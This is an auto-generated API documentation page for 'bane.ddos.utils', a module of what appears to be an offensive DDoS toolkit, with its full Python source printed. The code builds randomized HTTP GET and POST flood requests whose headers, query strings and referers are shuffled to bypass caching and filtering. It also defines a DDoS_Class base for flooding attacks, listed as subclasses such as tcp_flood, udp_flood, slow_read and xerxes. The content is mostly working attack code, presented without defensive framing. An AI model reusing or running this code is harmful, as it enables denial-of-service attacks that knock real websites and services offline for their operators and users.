<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.ddos.utils</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">import requests, cfscrape, socks, os, sys, urllib, socket, random, time, threading, ssl
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# import the dependencies for each python version
if sys.version_info &lt; (3, 0):
    # Python 2.x
    import httplib
    import urllib2
    try:
        from scapy.config import conf

        conf.ipv6_enabled = False
        from scapy.all import *
    except:
        pass
else:
    # Python 3.x
    import http.client

    httplib = http.client
    import urllib.request

    urllib2 = urllib.request
    from kamene.config import conf

    conf.ipv6_enabled = False
    from kamene.all import *
from struct import *
from bane.scanners.botnet.iot import getip
from bane.common.payloads import *
from bane.utils.proxer import *

if os.path.isdir(&#34;/data/data&#34;) == True:
    adr = True  # the device is an android
if os.path.isdir(&#34;/data/data/com.termux/&#34;) == True:
    termux = True  # the application which runs the module is Termux
if (termux == False) or (adr == False):
    from bane.utils.swtch import *

def reorder_headers_randomly(s):
    b = s.split(&#34;\r\n\r\n&#34;)[1]
    a = s.split(&#34;\r\n\r\n&#34;)[0]
    m = a.split(&#34;\r\n&#34;)[0]
    c = a.split(&#34;\r\n&#34;)[1:]
    random.shuffle(c)
    return m + &#34;\r\n&#34; + &#34;\r\n&#34;.join(c) + &#34;\r\n\r\n&#34; + b


def random_param():
    a = random.randint(1, 2)
    if a == 1:
        return str(random.randint(1, 1000))
    else:
        return random.choice(lis)


def setup_http_packet(
    target,
    ty,
    paths,
    post_field_min,
    post_field_max,
    post_min,
    post_max,
    cookie,
    user_agents,
):
    pa = random.choice(paths)  # bypassing cache engine
    q = &#34;&#34;
    for i in range(random.randint(2, 5)):
        q += random_param() + random_param()
    p = &#34;&#34;
    for i in range(random.randint(2, 5)):
        p += random_param() + random_param()
    if &#34;?&#34; in pa:
        jo = &#34;&amp;&#34;
    else:
        jo = &#34;?&#34;
    pa += jo + q + &#34;=&#34; + p
    # setting random headers
    for l in range(random.randint(1, 5)):
        ed = random.choice(ec)
        oi = random.randint(1, 3)
        if oi == 2:
            gy = 0
            while gy &lt; 1:
                df = random.choice(ec)
                if df != ed:
                    gy += 1
            ed += &#34;, &#34;
            ed += df
    l = random.choice(al)
    for n in range(random.randint(0, 5)):
        l += &#34;;q={},&#34;.format(round(random.uniform(0.1, 1), 1)) + random.choice(al)
    kl = random.randint(1, 2)
    ck = &#34;&#34;
    if cookie:
        ck = &#34;Cookie: &#34; + cookie + &#34;\r\n&#34;
    if ty == 1:
        m = &#34;GET {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n&#34;.format(
            pa,
            ck,
            random.choice(user_agents),
            random.choice(a),
            l,
            ed,
            random.choice(ac),
            random.randint(100, 1000),
            random.choice(cc),
            (
                random.choice(referers)
                + random.choice(lis)
                + str(random.randint(0, 100000000))
                + random.choice(lis)
            ),
            target,
        )
    else:
        k = &#34;&#34;
        for _ in range(random.randint(post_field_min, post_field_max)):
            k += random.choice(lis)
        j = &#34;&#34;
        for x in range(random.randint(post_min, post_max)):
            j += random.choice(lis)
        par = k + &#34;=&#34; + j
        m = &#34;POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}&#34;.format(
            pa,
            ck,
            random.choice(user_agents),
            l,
            random.randint(300, 1000),
            len(par),
            (
                random.choice(referers)
                + random.choice(lis)
                + str(random.randint(0, 100000000))
                + random.choice(lis)
            ),
            target,
            par,
        )
    return reorder_headers_randomly(m)


def get_public_dns(timeout=15):
    try:
        return (
            requests.get(
                &#34;https://public-dns.info/nameservers.txt&#34;, timeout=timeout
            ).text
        ).split(&#34;\n&#34;)
    except:
        return []


class DDoS_Class:

    def done(self):
        if &#34;stop&#34; in dir(self):
            return False
        return True

    def reset(self):
        l = []
        for x in self.__dict__:
            self.__dict__[x] = None
            l.append(x)
        for x in l:
            delattr(self, x)

    def kill(self):
        self.stop = True
        a = self.__dict__[&#34;counter&#34;]
        self.reset()  # this will kill any running threads instantly by setting all the attacking information to &#34;None&#34; and cause error which is handled with the &#34;try...except...&#34; around the main while loop
        return a</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-functions">Functions</h2>
<dl>
<dt id="bane.ddos.utils.get_public_dns"><code class="name flex">
<span>def <span class="ident">get_public_dns</span></span>(<span>timeout=15)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def get_public_dns(timeout=15):
    try:
        return (
            requests.get(
                &#34;https://public-dns.info/nameservers.txt&#34;, timeout=timeout
            ).text
        ).split(&#34;\n&#34;)
    except:
        return []</code></pre>
</details>
</dd>
<dt id="bane.ddos.utils.random_param"><code class="name flex">
<span>def <span class="ident">random_param</span></span>(<span>)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def random_param():
    a = random.randint(1, 2)
    if a == 1:
        return str(random.randint(1, 1000))
    else:
        return random.choice(lis)</code></pre>
</details>
</dd>
<dt id="bane.ddos.utils.reorder_headers_randomly"><code class="name flex">
<span>def <span class="ident">reorder_headers_randomly</span></span>(<span>s)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def reorder_headers_randomly(s):
    b = s.split(&#34;\r\n\r\n&#34;)[1]
    a = s.split(&#34;\r\n\r\n&#34;)[0]
    m = a.split(&#34;\r\n&#34;)[0]
    c = a.split(&#34;\r\n&#34;)[1:]
    random.shuffle(c)
    return m + &#34;\r\n&#34; + &#34;\r\n&#34;.join(c) + &#34;\r\n\r\n&#34; + b</code></pre>
</details>
</dd>
<dt id="bane.ddos.utils.setup_http_packet"><code class="name flex">
<span>def <span class="ident">setup_http_packet</span></span>(<span>target, ty, paths, post_field_min, post_field_max, post_min, post_max, cookie, user_agents)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def setup_http_packet(
    target,
    ty,
    paths,
    post_field_min,
    post_field_max,
    post_min,
    post_max,
    cookie,
    user_agents,
):
    pa = random.choice(paths)  # bypassing cache engine
    q = &#34;&#34;
    for i in range(random.randint(2, 5)):
        q += random_param() + random_param()
    p = &#34;&#34;
    for i in range(random.randint(2, 5)):
        p += random_param() + random_param()
    if &#34;?&#34; in pa:
        jo = &#34;&amp;&#34;
    else:
        jo = &#34;?&#34;
    pa += jo + q + &#34;=&#34; + p
    # setting random headers
    for l in range(random.randint(1, 5)):
        ed = random.choice(ec)
        oi = random.randint(1, 3)
        if oi == 2:
            gy = 0
            while gy &lt; 1:
                df = random.choice(ec)
                if df != ed:
                    gy += 1
            ed += &#34;, &#34;
            ed += df
    l = random.choice(al)
    for n in range(random.randint(0, 5)):
        l += &#34;;q={},&#34;.format(round(random.uniform(0.1, 1), 1)) + random.choice(al)
    kl = random.randint(1, 2)
    ck = &#34;&#34;
    if cookie:
        ck = &#34;Cookie: &#34; + cookie + &#34;\r\n&#34;
    if ty == 1:
        m = &#34;GET {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n&#34;.format(
            pa,
            ck,
            random.choice(user_agents),
            random.choice(a),
            l,
            ed,
            random.choice(ac),
            random.randint(100, 1000),
            random.choice(cc),
            (
                random.choice(referers)
                + random.choice(lis)
                + str(random.randint(0, 100000000))
                + random.choice(lis)
            ),
            target,
        )
    else:
        k = &#34;&#34;
        for _ in range(random.randint(post_field_min, post_field_max)):
            k += random.choice(lis)
        j = &#34;&#34;
        for x in range(random.randint(post_min, post_max)):
            j += random.choice(lis)
        par = k + &#34;=&#34; + j
        m = &#34;POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}&#34;.format(
            pa,
            ck,
            random.choice(user_agents),
            l,
            random.randint(300, 1000),
            len(par),
            (
                random.choice(referers)
                + random.choice(lis)
                + str(random.randint(0, 100000000))
                + random.choice(lis)
            ),
            target,
            par,
        )
    return reorder_headers_randomly(m)</code></pre>
</details>
</dd>
</dl>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="bane.ddos.utils.DDoS_Class"><code class="flex name class">
<span>class <span class="ident">DDoS_Class</span></span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class DDoS_Class:

    def done(self):
        if &#34;stop&#34; in dir(self):
            return False
        return True

    def reset(self):
        l = []
        for x in self.__dict__:
            self.__dict__[x] = None
            l.append(x)
        for x in l:
            delattr(self, x)

    def kill(self):
        self.stop = True
        a = self.__dict__[&#34;counter&#34;]
        self.reset()  # this will kill any running threads instantly by setting all the attacking information to &#34;None&#34; and cause error which is handled with the &#34;try...except...&#34; around the main while loop
        return a</code></pre>
</details>
<h3>Subclasses</h3>
<ul class="hlist">
<li><a title="bane.ddos.http_spam.http_spam" href="http_spam.html#bane.ddos.http_spam.http_spam">http_spam</a></li>
<li><a title="bane.ddos.proxies_hammer.prox_hammer" href="proxies_hammer.html#bane.ddos.proxies_hammer.prox_hammer">prox_hammer</a></li>
<li><a title="bane.ddos.proxies_http_spam.prox_http_spam" href="proxies_http_spam.html#bane.ddos.proxies_http_spam.prox_http_spam">prox_http_spam</a></li>
<li><a title="bane.ddos.proxies_xerxes.prox_xerxes" href="proxies_xerxes.html#bane.ddos.proxies_xerxes.prox_xerxes">prox_xerxes</a></li>
<li><a title="bane.ddos.slow_read.slow_read" href="slow_read.html#bane.ddos.slow_read.slow_read">slow_read</a></li>
<li><a title="bane.ddos.tcp.tcp_flood" href="tcp.html#bane.ddos.tcp.tcp_flood">tcp_flood</a></li>
<li><a title="bane.ddos.torshammer.torshammer" href="torshammer.html#bane.ddos.torshammer.torshammer">torshammer</a></li>
<li><a title="bane.ddos.udp.udp_flood" href="udp.html#bane.ddos.udp.udp_flood">udp_flood</a></li>
<li><a title="bane.ddos.vse.vse_flood" href="vse.html#bane.ddos.vse.vse_flood">vse_flood</a></li>
<li><a title="bane.ddos.xerxes.xerxes" href="xerxes.html#bane.ddos.xerxes.xerxes">xerxes</a></li>
</ul>
<h3>Methods</h3>
<dl>
<dt id="bane.ddos.utils.DDoS_Class.done"><code class="name flex">
<span>def <span class="ident">done</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def done(self):
    if &#34;stop&#34; in dir(self):
        return False
    return True</code></pre>
</details>
</dd>
<dt id="bane.ddos.utils.DDoS_Class.kill"><code class="name flex">
<span>def <span class="ident">kill</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def kill(self):
    self.stop = True
    a = self.__dict__[&#34;counter&#34;]
    self.reset()  # this will kill any running threads instantly by setting all the attacking information to &#34;None&#34; and cause error which is handled with the &#34;try...except...&#34; around the main while loop
    return a</code></pre>
</details>
</dd>
<dt id="bane.ddos.utils.DDoS_Class.reset"><code class="name flex">
<span>def <span class="ident">reset</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def reset(self):
    l = []
    for x in self.__dict__:
        self.__dict__[x] = None
        l.append(x)
    for x in l:
        delattr(self, x)</code></pre>
</details>
</dd>
</dl>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="bane.ddos" href="index.md">bane.ddos</a></code></li>
</ul>
</li>
<li><h3><a href="#header-functions">Functions</a></h3>
<ul class="">
<li><code><a title="bane.ddos.utils.get_public_dns" href="#bane.ddos.utils.get_public_dns">get_public_dns</a></code></li>
<li><code><a title="bane.ddos.utils.random_param" href="#bane.ddos.utils.random_param">random_param</a></code></li>
<li><code><a title="bane.ddos.utils.reorder_headers_randomly" href="#bane.ddos.utils.reorder_headers_randomly">reorder_headers_randomly</a></code></li>
<li><code><a title="bane.ddos.utils.setup_http_packet" href="#bane.ddos.utils.setup_http_packet">setup_http_packet</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="bane.ddos.utils.DDoS_Class" href="#bane.ddos.utils.DDoS_Class">DDoS_Class</a></code></h4>
<ul class="">
<li><code><a title="bane.ddos.utils.DDoS_Class.done" href="#bane.ddos.utils.DDoS_Class.done">done</a></code></li>
<li><code><a title="bane.ddos.utils.DDoS_Class.kill" href="#bane.ddos.utils.DDoS_Class.kill">kill</a></code></li>
<li><code><a title="bane.ddos.utils.DDoS_Class.reset" href="#bane.ddos.utils.DDoS_Class.reset">reset</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>